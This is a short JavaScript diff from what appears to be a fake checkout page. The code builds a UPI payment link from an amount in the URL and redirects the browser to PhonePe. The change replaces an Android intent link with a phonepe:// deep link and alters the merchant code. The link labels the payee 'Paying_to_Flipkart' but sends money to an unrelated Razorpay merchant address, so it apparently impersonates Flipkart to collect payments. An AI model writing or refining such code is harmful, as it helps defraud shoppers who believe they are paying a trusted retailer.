@@ -962,8 +962,7 @@
         const amount = getAmountFromURL();
 
         // Create intent-based URL
-        const upiLink = `intent://pay?pa=fastioncloth232638.rzp@icici&pn=Paying_to_Flipkart&tr=Mairtel&am=${amount}&cu=INR&tn=Payment&mc=0000&mode=02#Intent;scheme=upi;package=com.phonepe.app;end`;
-
+        const upiLink = `phonepe://pay?ver=01&mode=19&pa=fastioncloth232638.rzp@icici&pn=Paying_to_Flipkart&tr=Mairtel&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${amount}`;
         // Open UPI app
         window.location.href = upiLink;
 
